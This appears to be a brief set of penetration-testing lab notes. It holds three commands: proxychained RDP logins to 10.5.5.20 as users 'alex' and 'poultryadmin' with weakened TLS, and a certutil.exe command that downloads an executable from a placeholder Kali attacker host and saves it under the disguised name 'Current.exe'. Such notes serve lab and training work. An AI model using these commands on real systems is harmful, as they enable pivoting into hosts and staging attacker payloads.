**Connect to RDP**
```
proxychains xfreerdp /d:sandbox /u:alex /v:10.5.5.20 +clipboard /tls-seclevel:0 /timeout:80000
```

**Connect to RDP using poultryadmin**
```
proxychains xfreerdp /u:poultryadmin /v:10.5.5.20 +clipboard /tls-seclevel:0 /timeout:80000
```

**Download file from Kali**
```
certutil.exe -urlcache -f http://KALI_IP/whoami.exe Current.exe
```